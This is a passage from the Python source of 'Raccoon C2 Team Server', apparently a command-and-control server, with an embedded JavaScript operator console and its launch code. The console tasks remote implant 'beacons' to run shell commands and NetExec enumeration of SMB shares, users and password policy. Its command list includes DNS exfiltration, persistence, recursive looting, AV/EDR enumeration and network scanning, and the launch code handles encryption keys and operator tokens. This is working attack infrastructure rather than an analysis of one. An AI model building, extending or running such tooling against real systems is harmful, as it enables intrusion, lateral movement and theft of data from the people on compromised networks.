  const sx = e.clientX - rect.left;
  const sy = e.clientY - rect.top;
  const w = pivotScreenToWorld(sx, sy);

  for(const n of pivotNodes){
    if(n.type === "subnet") continue;
    const dx = w.x - n.x, dy = w.y - n.y;
    const hitR = 600 / (pivotZoom * pivotZoom);
    if(dx*dx + dy*dy < hitR){
      pivotDrag = {node: n, offX: dx, offY: dy};
      canvas.style.cursor = "grabbing";
      return;
    }
  }
  pivotPanStart = {x: e.clientX - pivotPan.x, y: e.clientY - pivotPan.y};
  canvas.style.cursor = "grabbing";
}

function pivotMouseMove(e){
  pivotDidDrag = true;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  if(pivotDrag){
    const sx = e.clientX - rect.left;
    const sy = e.clientY - rect.top;
    pivotDrag.node.x = (sx - pivotPan.x) / pivotZoom - pivotDrag.offX;
    pivotDrag.node.y = (sy - pivotPan.y) / pivotZoom - pivotDrag.offY;
  } else if(pivotPanStart){
    pivotPan.x = e.clientX - pivotPanStart.x;
    pivotPan.y = e.clientY - pivotPanStart.y;
  }
}

function pivotMouseUp(e){
  pivotDrag = null;
  pivotPanStart = null;
  if(e.target.tagName === "CANVAS") e.target.style.cursor = "grab";
}

function pivotClick(e){
  if(pivotDidDrag) return;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  const sx = e.clientX - rect.left;
  const sy = e.clientY - rect.top;
  const w = pivotScreenToWorld(sx, sy);

  for(const n of pivotNodes){
    if(n.type === "subnet") continue;
    const dx = w.x - n.x, dy = w.y - n.y;
    if(dx*dx + dy*dy < 400){
      showNodeTooltip(n, e.clientX, e.clientY);
      return;
    }
  }
  dismissTooltip();
}

function dismissTooltip(){
  const wrap = document.getElementById("pivot-tooltip-wrap");
  if(wrap) wrap.innerHTML = "";
}

function showNodeTooltip(node, mx, my){
  const wrap = document.getElementById("pivot-tooltip-wrap");
  if(!wrap) return;

  const wRect = wrap.getBoundingClientRect();
  const tipX = Math.max(0, Math.min(mx - wRect.left + 12, wRect.width - 280));
  const tipY = Math.max(0, Math.min(my - wRect.top - 40, wRect.height - 200));

  let html = '<div class="pivot-tooltip" style="left:'+tipX+'px;top:'+tipY+'px;position:absolute">';

  if(node.type === "c2"){
    html += '<div class="tt-header"><span class="tt-dot" style="background:#ff1a1a;box-shadow:0 0 6px #ff1a1a"></span>';
    html += '<span class="tt-title">C2 Server</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    html += '<div class="tt-row"><span class="tt-lbl">Address</span><span class="tt-val">'+esc(window.location.host)+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Protocol</span><span class="tt-val">'+esc(window.location.protocol.replace(":",""))+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Role</span><span class="tt-val highlight">Team Server</span></div>';
    html += '</div>';
  } else if(node.type === "beacon"){
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+';box-shadow:0 0 6px '+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(node.label)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    const sub = (node.sub||"").split("\n");
    if(sub[0]) html += '<div class="tt-row"><span class="tt-lbl">Identity</span><span class="tt-val">'+esc(sub[0])+'</span></div>';
    if(sub[1]) html += '<div class="tt-row"><span class="tt-lbl">IPs</span><span class="tt-val">'+esc(sub[1])+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Status</span><span class="tt-val '+(node.status==="online"?"highlight":"warn")+'">'+esc(node.status||"?")+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Type</span><span class="tt-val">Implant Beacon</span></div>';
    html += '</div>';
  } else if(node.type === "host" && node.hostData){
    const d = node.hostData;
    const criticalPorts = new Set([21,23,135,139,445,3389,5900,5985]);
    const sslPorts = new Set([443,993,995,8443,636,989,990,992,5986,9443]);
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+';box-shadow:0 0 6px '+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(d.hostname||d.ip)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    html += '<div class="tt-row"><span class="tt-lbl">IP</span><span class="tt-val">'+esc(d.ip)+'</span></div>';
    if(d.hostname) html += '<div class="tt-row"><span class="tt-lbl">Hostname</span><span class="tt-val">'+esc(d.hostname)+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">MAC</span><span class="tt-val" style="font-family:var(--mono)">'+esc(d.mac||"?")+'</span></div>';
    if(d.vendor) html += '<div class="tt-row"><span class="tt-lbl">Vendor</span><span class="tt-val highlight">'+esc(d.vendor)+'</span></div>';
    if(d.os_guess) html += '<div class="tt-row"><span class="tt-lbl">OS Guess</span><span class="tt-val warn">'+esc(d.os_guess)+'</span></div>';
    if(d.type && d.type !== "?") html += '<div class="tt-row"><span class="tt-lbl">ARP Type</span><span class="tt-val">'+esc(d.type)+'</span></div>';
    if(d.ports && d.ports.length){
      html += '<div class="tt-section">Open Ports ('+d.ports.length+')</div>';
      html += '<div class="tt-ports">';
      (d.port_info||d.ports.map(String)).forEach(p => {
        const portNum = parseInt(p);
        const isCrit = criticalPorts.has(portNum);
        const isSsl = sslPorts.has(portNum);
        let cls = "tt-port";
        if(isCrit) cls += " critical";
        else if(isSsl) cls += " ssl";
        html += '<span class="'+cls+'">'+esc(String(p))+'</span>';
      });
      html += '</div>';
    }
    if(d.banners && Object.keys(d.banners).length){
      const sslBanners = [];
      const otherBanners = [];
      Object.entries(d.banners).forEach(([port, banner]) => {
        if(sslPorts.has(parseInt(port)) || banner.includes("TLS") || banner.includes("SSL") || banner.includes("CN="))
          sslBanners.push([port, banner]);
        else
          otherBanners.push([port, banner]);
      });
      if(sslBanners.length){
        html += '<div class="tt-section" style="color:#44ddaa">&#128274; SSL/TLS Certificates</div>';
        sslBanners.forEach(([port, banner]) => {
          html += '<div class="tt-banner ssl"><strong>:'+esc(port)+'</strong> ';
          const parts = banner.split(" | ");
          parts.forEach((part, i) => {
            if(part.startsWith("CN="))
              html += '<span style="color:#44ddaa">'+esc(part)+'</span>';
            else if(part.startsWith("Issuer="))
              html += '<span style="color:var(--text2)">'+esc(part)+'</span>';
            else if(part.startsWith("Expires="))
              html += '<span style="color:var(--orange)">'+esc(part)+'</span>';
            else if(part.startsWith("SAN="))
              html += '<span style="color:#88aacc">'+esc(part)+'</span>';
            else
              html += '<span>'+esc(part)+'</span>';
            if(i < parts.length-1) html += ' <span style="color:var(--border)">|</span> ';
          });
          html += '</div>';
        });
      }
      if(otherBanners.length){
        html += '<div class="tt-section">Service Banners</div>';
        otherBanners.forEach(([port, banner]) => {
          html += '<div class="tt-banner"><strong>:'+esc(port)+'</strong> '+esc(banner)+'</div>';
        });
      }
    }
    if(!d.ports || !d.ports.length){
      html += '<div class="tt-section">Info</div>';
      html += '<div style="font-size:10px;color:var(--text2);padding:2px 0">No open ports detected. Run ARP Table or Scan Subnet.</div>';
    }
    html += '</div>';
  } else {
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(node.label)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    if(node.sub) html += '<div class="tt-row"><span class="tt-lbl">Info</span><span class="tt-val">'+esc(node.sub)+'</span></div>';
    html += '</div>';
  }
  html += '</div>';
  wrap.innerHTML = html;
}

function pivotWheel(e){
  e.preventDefault();
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  const mx = e.clientX - rect.left;
  const my = e.clientY - rect.top;
  const delta = e.deltaY > 0 ? 0.9 : 1.1;
  pivotApplyZoom(delta, mx, my);
}

function pivotApplyZoom(factor, cx, cy){
  const oldZ = pivotZoom;
  pivotZoom = Math.max(0.15, Math.min(5, pivotZoom * factor));
  const ratio = pivotZoom / oldZ;
  pivotPan.x = cx - (cx - pivotPan.x) * ratio;
  pivotPan.y = cy - (cy - pivotPan.y) * ratio;
  updateZoomLabel();
}

function pivotZoomIn(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas) return;
  pivotApplyZoom(1.25, canvas.width/2, canvas.height/2);
}

function pivotZoomOut(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas) return;
  pivotApplyZoom(0.8, canvas.width/2, canvas.height/2);
}

function pivotFitAll(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas || !pivotNodes.length) return;
  let minX=Infinity, minY=Infinity, maxX=-Infinity, maxY=-Infinity;
  pivotNodes.forEach(n => {
    if(n.type === "subnet"){
      minX = Math.min(minX, n.x);
      minY = Math.min(minY, n.y);
      maxX = Math.max(maxX, n.x + n.w);
      maxY = Math.max(maxY, n.y + n.h);
    } else {
      const r = 40;
      minX = Math.min(minX, n.x - r);
      minY = Math.min(minY, n.y - r);
      maxX = Math.max(maxX, n.x + r);
      maxY = Math.max(maxY, n.y + r + 40);
    }
  });
  const pad = 40;
  minX -= pad; minY -= pad; maxX += pad; maxY += pad;
  const bw = maxX - minX;
  const bh = maxY - minY;
  const cw = canvas.width;
  const ch = canvas.height;
  pivotZoom = Math.min(cw / bw, ch / bh, 2);
  pivotPan.x = (cw - bw * pivotZoom) / 2 - minX * pivotZoom;
  pivotPan.y = (ch - bh * pivotZoom) / 2 - minY * pivotZoom;
  updateZoomLabel();
}

function updateZoomLabel(){
  const el = document.getElementById("pivot-zoom-label");
  if(el) el.textContent = Math.round(pivotZoom * 100) + "%";
}

async function runNetScan(){
  if(!selectedAgent) return;
  toast("info","Pivot","Network scan started...",3000);
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"netscan", args:"", data:""})
  });
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(pollNetScanResult, 2000);
  pollHistory(selectedAgent);
}

async function runArpScan(){
  if(!selectedAgent) return;
  toast("info","Pivot","ARP table requested...",3000);
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"arptable", args:"", data:""})
  });
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(pollArpResult, 2000);
  pollHistory(selectedAgent);
}

function showNxcMenu(btn){
  let menu = document.getElementById("nxc-menu");
  if(menu){ menu.remove(); return; }
  const scanResults = pivotScanData[selectedAgent] || [];
  const hosts = scanResults.map(h => h.ip);
  const subnet = hosts.length ? hosts[0].split(".").slice(0,3).join(".")+".0/24" : "";
  menu = document.createElement("div");
  menu.id = "nxc-menu";
  menu.className = "nxc-menu";
  let html = '<div class="nxc-title">NetExec Scans</div>';
  html += '<div class="nxc-section">Subnet Discovery</div>';
  html += '<button onclick="nxcRun(\'smb\',\''+esc(subnet)+'\',\'\')">SMB hosts (signing, OS)</button>';
  html += '<button onclick="nxcRun(\'rdp\',\''+esc(subnet)+'\',\'\')">RDP hosts (NLA, screenshot)</button>';
  html += '<button onclick="nxcRun(\'winrm\',\''+esc(subnet)+'\',\'\')">WinRM hosts</button>';
  html += '<button onclick="nxcRun(\'ssh\',\''+esc(subnet)+'\',\'\')">SSH hosts</button>';
  html += '<button onclick="nxcRun(\'mssql\',\''+esc(subnet)+'\',\'\')">MSSQL instances</button>';
  html += '<div class="nxc-section">Enumeration (select host)</div>';
  html += '<div class="nxc-host-pick"><select id="nxc-target">';
  if(!hosts.length) html += '<option value="">No hosts discovered</option>';
  hosts.forEach(ip => { html += '<option value="'+esc(ip)+'">'+esc(ip)+'</option>'; });
  html += '</select></div>';
  html += '<button onclick="nxcTargetRun(\'smb\',\'--shares\')">SMB Shares</button>';
  html += '<button onclick="nxcTargetRun(\'smb\',\'--users\')">SMB Users</button>';
  html += '<button onclick="nxcTargetRun(\'smb\',\'--sessions\')">SMB Sessions</button>';
  html += '<button onclick="nxcTargetRun(\'smb\',\'--pass-pol\')">Password Policy</button>';
  html += '<button onclick="nxcTargetRun(\'smb\',\'--groups\')">Domain Groups</button>';
  html += '<button onclick="nxcTargetRun(\'ldap\',\'--active-users\')">Active LDAP Users</button>';
  html += '<div class="nxc-section">AV/EDR Enum (server-side, Impacket)</div>';
  html += '<button onclick="showAvEnumDialog()">🛡️ Remote AV/EDR Scan</button>';
  html += '<div class="nxc-section">Custom</div>';
  html += '<div class="nxc-custom"><input id="nxc-custom-args" placeholder="e.g. smb 10.0.0.0/24 --gen-relay-list /tmp/r.txt" style="width:100%"><button onclick="nxcCustomRun()">Run</button></div>';
  html += '<div class="nxc-note">Requires nxc/netexec on beacon host</div>';
  menu.innerHTML = html;
  btn.parentElement.appendChild(menu);
  document.addEventListener("click", function closeNxc(e){
    if(!e.target.closest("#nxc-menu") && !e.target.closest("[onclick*=showNxcMenu]")){
      const m = document.getElementById("nxc-menu");
      if(m) m.remove();
      document.removeEventListener("click", closeNxc);
    }
  });
}

function nxcRun(proto, target, flags){
  if(!selectedAgent || !target) return;
  const cmd = 'nxc '+proto+' '+target+(flags?' '+flags:'');
  document.getElementById("nxc-menu")?.remove();
  toast("info","NXC","Running: "+cmd,4000);
  quickCmd('shell', cmd, 'NXC: '+proto+' scan');
}

function nxcTargetRun(proto, flags){
  const target = document.getElementById("nxc-target")?.value;
  if(!target){ toast("warn","NXC","Select a target host first",3000); return; }
  nxcRun(proto, target, flags);
}

function nxcCustomRun(){
  const args = document.getElementById("nxc-custom-args")?.value?.trim();
  if(!args){ toast("warn","NXC","Enter nxc arguments",3000); return; }
  document.getElementById("nxc-menu")?.remove();
  toast("info","NXC","Running: nxc "+args,4000);
  quickCmd('shell', 'nxc '+args, 'NXC: custom');
}

async function pollNetScanResult(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="netscan");
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }

  if(last.status==="ok" && last.output){
    const hosts = [];
    last.output.split("\n").forEach(line => {
      const m = line.match(/^\s+([\d.]+)(?:\s+\(([^)]+)\))?\s+ports:\[([^\]]*)\]/);
      if(m){
        hosts.push({
          ip: m[1],
          hostname: m[2]||"",
          ports: m[3] ? m[3].split(",").map(Number).filter(Boolean) : []
        });
      }
    });
    pivotScanData[selectedAgent] = hosts;
    toast("success","Pivot","Found "+hosts.length+" hosts",4000);
    persistScanData();
  }
  refreshPivotMap();
}

async function pollArpResult(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="arptable");
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }

  if(last.status==="ok" && last.output){
    let parsed;
    try{ parsed = JSON.parse(last.output); }catch(e){ parsed = null; }
    if(parsed && parsed.entries){
      const seen = new Set();
      const hosts = parsed.entries.filter(e => {
        if(e.self) return false;
        const o = parseInt(e.ip);
        if(o >= 224 || o === 127) return false;
        if(seen.has(e.ip)) return false;
        seen.add(e.ip);
        return true;
      }).map(e => ({
        ip: e.ip, hostname: e.hostname||"", mac: e.mac||"",
        vendor: e.vendor||"", os_guess: e.os_guess||"",
        ports: e.ports||[], port_info: e.port_info||[],
        banners: e.banners||{}, type: e.type||""
      }));
      const existing = pivotScanData[selectedAgent] || [];
      const existingIps = new Set(existing.map(h => h.ip));
      hosts.forEach(h => {
        if(existingIps.has(h.ip)){
          const old = existing.find(o => o.ip === h.ip);
          if(old) Object.assign(old, h);
        } else {
          existing.push(h);
        }
      });
      pivotScanData[selectedAgent] = existing;
      toast("success","Pivot","ARP: "+hosts.length+" devices discovered",4000);
      persistScanData();
    }
  }
  refreshPivotMap();
}

async function persistScanData(){
  if(!selectedAgent || !pivotScanData[selectedAgent]) return;
  await api("/api/agents/"+selectedAgent+"/scan",{
    method:"POST", body:JSON.stringify(pivotScanData[selectedAgent])
  });
}

async function refreshPivotMap(){
  if(!selectedAgent) return;
  const info = await api("/api/agents/"+selectedAgent);
  const allAgents = await api("/api/agents");
  buildPivotGraph(info, allAgents);
}

// ── Autocomplete ──
const AC_COMMANDS = [
  {cmd:"shell", hint:"Execute shell command", args:true},
  {cmd:"ls", hint:"List directory", args:true},
  {cmd:"lsjson", hint:"List directory (JSON with metadata)", args:true},
  {cmd:"cat", hint:"Read file", args:true},
  {cmd:"pwd", hint:"Print working directory", args:false},
  {cmd:"cd", hint:"Change directory", args:true},
  {cmd:"cp", hint:"Copy file", args:true},
  {cmd:"mv", hint:"Move/rename file", args:true},
  {cmd:"rm", hint:"Remove file/directory", args:true},
  {cmd:"mkdir", hint:"Create directory", args:true},
  {cmd:"chmod", hint:"Change permissions", args:true},
  {cmd:"write", hint:"Write text to file", args:true},
  {cmd:"upload", hint:"Upload file to agent", args:true},
  {cmd:"download", hint:"Download file from agent", args:true},
  {cmd:"exfil", hint:"Exfiltrate via DNS", args:true},
  {cmd:"sleep", hint:"Set interval + jitter", args:true},
  {cmd:"persist", hint:"Install persistence", args:true},
  {cmd:"unpersist", hint:"Remove persistence", args:true},
  {cmd:"netscan", hint:"Scan local subnet", args:true},
  {cmd:"arptable", hint:"Show ARP neighbors", args:false},
  {cmd:"proxyinfo", hint:"Show proxy configuration", args:false},
  {cmd:"avenum", hint:"Enumerate AV/EDR/SIEM tools", args:false},
  {cmd:"loot", hint:"Loot directory (recursive zip)", args:true},
  {cmd:"kill", hint:"Terminate beacon", args:false},
];

let acItems = [];
let acIdx = -1;

function getCompletions(text){
  const parts = text.split(/\s+/);
  const cmd = parts[0]||"";
  if(parts.length<=1){
    return AC_COMMANDS.filter(c => c.cmd.startsWith(cmd)).map(c => ({value:c.cmd, hint:c.hint}));
  }
  const partial = parts[parts.length-1]||"";
  const pathCmds = ["ls","cat","cd","cp","mv","rm","mkdir","chmod","download","upload","write","exfil","shell"];
  if(!pathCmds.includes(cmd)) return [];
  const known = collectKnownPaths();
  return known.filter(p => p.startsWith(partial)||p.includes(partial))
    .slice(0,12)
    .map(p => ({value: parts.slice(0,-1).join(" ")+" "+p, hint:"path"}));
}

function collectKnownPaths(){
  const paths = new Set();
  cmdHistory.forEach(h => {
    const p = h.split(/\s+/).slice(1);
    p.forEach(a => { if(a.startsWith("/")||a.startsWith("./")) paths.add(a); });
  });
  if(typeof fbPath!=="undefined" && fbPath) paths.add(fbPath);
  return [...paths].sort();
}

function updateAutocomplete(){
  const input = document.getElementById("cmd-input");
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");
  if(!input||!dd) return;
  const text = input.value;
  if(!text){ dd.classList.remove("open"); ghost.textContent=""; acItems=[]; return; }
  acItems = getCompletions(text);
  acIdx = -1;
  if(!acItems.length){ dd.classList.remove("open"); ghost.textContent=""; return; }
  ghost.textContent = acItems[0].value;
  dd.innerHTML = "";
  acItems.forEach((item,i) => {
    const el = document.createElement("div");
    el.className = "ac-item";
    el.innerHTML = esc(item.value)+'<span class="hint">'+esc(item.hint)+'</span>';
    el.onmousedown = e => { e.preventDefault(); input.value=item.value; dd.classList.remove("open"); ghost.textContent=""; input.focus(); };
    dd.appendChild(el);
  });
  dd.classList.add("open");
}

function handleInputKey(e){
  const input = document.getElementById("cmd-input");
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");

  if(e.key==="Tab"){
    e.preventDefault();
    if(acItems.length>0){
      const pick = acIdx>=0 ? acItems[acIdx] : acItems[0];
      input.value = pick.value;
      dd.classList.remove("open");
      ghost.textContent = "";
      acItems = [];
    }
    return;
  }
  if(e.key==="Enter"){
    dd.classList.remove("open");
    ghost.textContent = "";
    sendCmd();
    e.preventDefault();
    return;
  }
  if(e.key==="Escape"){
    dd.classList.remove("open");
    ghost.textContent = "";
    acItems = [];
    return;
  }
  if(dd.classList.contains("open")){
    if(e.key==="ArrowDown"){
      e.preventDefault();
      acIdx = Math.min(acIdx+1, acItems.length-1);
      highlightAcItem();
      return;
    }
    if(e.key==="ArrowUp" && acIdx>=0){
      e.preventDefault();
      acIdx--;
      highlightAcItem();
      return;
    }
  }
  if(e.key==="ArrowUp"){
    e.preventDefault();
    if(cmdIdx<cmdHistory.length-1){cmdIdx++;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}
  } else if(e.key==="ArrowDown"){
    e.preventDefault();
    if(cmdIdx>0){cmdIdx--;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}
    else{cmdIdx=-1;input.value=""}
  }
}

function highlightAcItem(){
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");
  if(!dd) return;
  [...dd.children].forEach((el,i) => el.classList.toggle("selected", i===acIdx));
  if(acIdx>=0 && acItems[acIdx]) ghost.textContent = acItems[acIdx].value;
}

// ── Settings panel ──
let settingsOpen = false;

function toggleSettings(){
  const panel = document.getElementById("settings-panel");
  if(!panel) return;
  settingsOpen = !settingsOpen;
  panel.classList.toggle("open", settingsOpen);
  if(settingsOpen) loadSettings();
}

document.addEventListener("click", e => {
  const panel = document.getElementById("settings-panel");
  const wrap = e.target.closest(".gear-wrap");
  if(panel && panel.classList.contains("open") && !wrap){
    panel.classList.remove("open");
    settingsOpen = false;
  }
});

async function loadSettings(){
  const body = document.getElementById("settings-body");
  if(!body) return;
  try{
    const cfg = await api("/api/server/config");
    const proto = cfg.ssl ? "https" : "http";
    const listen = proto+"://"+cfg.host+":"+cfg.port;
    const keyStatus = cfg.key_type === "default"
      ? '<span class="cfg-value warn">DEFAULT (insecure!)</span>'
      : '<span class="cfg-value ok">'+esc(cfg.key_type)+'</span>';
    const sslStatus = cfg.ssl
      ? '<span class="cfg-value secure">&#128274; Enabled'+(cfg.cert?' ('+esc(cfg.cert)+')':' (self-signed)')+'</span>'
      : '<span class="cfg-value warn">&#128275; Disabled</span>';
    const keyPreview = cfg.enc_key.length > 20 ? cfg.enc_key.substring(0,20)+"..." : cfg.enc_key;

    body.innerHTML = `
      <div class="cfg-section">
        <div class="cfg-section-title">&#127760; Network</div>
        <div class="cfg-row"><span class="cfg-label">Listen</span><span class="cfg-value">${esc(listen)}</span></div>
        <div class="cfg-row"><span class="cfg-label">SSL/TLS</span>${sslStatus}</div>
        <div class="cfg-row"><span class="cfg-label">GUI</span><span class="cfg-value">${esc(proto+"://localhost:"+cfg.port)}</span></div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128274; Security</div>
        <div class="cfg-row">
          <span class="cfg-label">Encryption</span>${keyStatus}
        </div>
        <div class="cfg-row">
          <span class="cfg-label">Enc Key</span>
          <span class="cfg-value" id="cfg-enc-key" style="cursor:pointer" title="Click to reveal">${esc(keyPreview)}</span>
          <button class="cfg-copy" onclick="copyToClipboard('${esc(cfg.enc_key)}','Encryption key')">copy</button>
        </div>
        <div class="cfg-row">
          <span class="cfg-label">Token</span>
          <span class="cfg-value" style="cursor:pointer" onclick="this.textContent=this.dataset.full||this.textContent" data-full="${esc(cfg.operator_token)}">${esc(cfg.operator_token.substring(0,12)+"...")}</span>
          <button class="cfg-copy" onclick="copyToClipboard('${esc(cfg.operator_token)}','Operator token')">copy</button>
        </div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128193; Storage</div>
        <div class="cfg-row"><span class="cfg-label">Data Dir</span><span class="cfg-value">${esc(cfg.data_dir)}</span></div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128202; Statistics</div>
        <div class="cfg-row"><span class="cfg-label">Uptime</span><span class="cfg-uptime">${formatUptime(cfg.uptime)}</span></div>
        <div class="cfg-stats-row">
          <div class="cfg-stat"><span class="num" style="color:var(--green)">${cfg.agents_online}</span> online</div>
          <div class="cfg-stat"><span class="num" style="color:var(--text)">${cfg.agents_total}</span> total</div>
          <div class="cfg-stat"><span class="num" style="color:var(--yellow)">${cfg.tasks_total}</span> tasks</div>
        </div>
      </div>
    `;

    const encKeyEl = document.getElementById("cfg-enc-key");
    if(encKeyEl){
      encKeyEl.onclick = () => { encKeyEl.textContent = cfg.enc_key; };
    }
  }catch(e){
    body.innerHTML = '<div style="padding:20px;color:#ff6666">Failed to load config</div>';
  }
}

function copyToClipboard(text, label){
  navigator.clipboard.writeText(text).then(() => {
    toast("info","Copied",esc(label)+" copied to clipboard",2000);
  }).catch(() => {
    const ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("info","Copied",esc(label)+" copied to clipboard",2000);
  });
}

setInterval(refreshAgents, 3000);
setInterval(checkTaskResults, 2500);
refreshAgents();
toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
</script>
</body>
</html>
"""


# ── CLI ──

def main():
    parser = argparse.ArgumentParser(
        description="Raccoon C2 Team Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--key", help="Base64-encoded 32-byte AES-GCM key")
    parser.add_argument(
        "--derive-key",
        help="Derive key from 'callback_url:dns_domain' (must match beacon config)",
    )
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS (self-signed)")
    parser.add_argument("--cert", help="SSL certificate file")
    parser.add_argument("--certkey", help="SSL private key file")
    parser.add_argument("--token", help="Fixed operator token (default: random)")
    parser.add_argument(
        "--data-dir", default=str(Path.home() / ".raccoon-c2"),
        help="Data directory for state persistence",
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
    )

    if args.key:
        key = base64.b64decode(args.key)
    elif args.derive_key:
        parts = args.derive_key
        key = hashlib.sha256(parts.encode()).digest()
    else:
        key = hashlib.sha256(b":").digest()
        logger.warning("No encryption key specified — using default derived key")
        logger.warning("Use --key or --derive-key for production")

    crypto = ServerCrypto(key)

    operator_token = args.token or secrets.token_urlsafe(24)
    data_dir = Path(args.data_dir)
    data_dir.mkdir(parents=True, exist_ok=True)

    _load_state(data_dir)
    _setup_file_logging(data_dir)
    _log_event("STARTUP", f"Server starting on {'https' if args.ssl else 'http'}://"
               f"{args.host}:{args.port}")

    srv_config = {
        "host": args.host,
        "port": args.port,
        "ssl": args.ssl,
        "cert": args.cert or "",
        "key_type": "explicit" if args.key else ("derived" if args.derive_key else "default"),
        "start_time": time.time(),
    }
    app = create_app(crypto, operator_token, data_dir, server_config=srv_config)

    banner = (
        f"\n{'=' * 60}\n"
        f"  Raccoon C2 Team Server\n"
        f"{'=' * 60}\n"
        f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}\n"
        f"  Token:    {operator_token}\n"
        f"  Data:     {data_dir}\n"
        f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}\n"
        f"{'=' * 60}\n"
    )
    try:
        print(banner)
    except UnicodeEncodeError:
        print(banner.encode("ascii", errors="replace").decode())

    ssl_ctx = None
    if args.ssl:
        if args.cert and args.certkey:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx.load_cert_chain(args.cert, args.certkey)
            keylog = os.environ.get("SSLKEYLOGFILE")
            if keylog and hasattr(ssl_ctx, "keylog_filename"):
                ssl_ctx.keylog_filename = keylog
                logger.info("TLS keylog → %s", keylog)
        else:
            ssl_ctx = "adhoc"
            logger.info("Using self-signed certificate (install pyopenssl: pip install pyopenssl)")

    app.run(
        host=args.host,
        port=args.port,
        ssl_context=ssl_ctx,
        debug=False,
        threaded=True,
    )


if __name__ == "__main__":
    main()
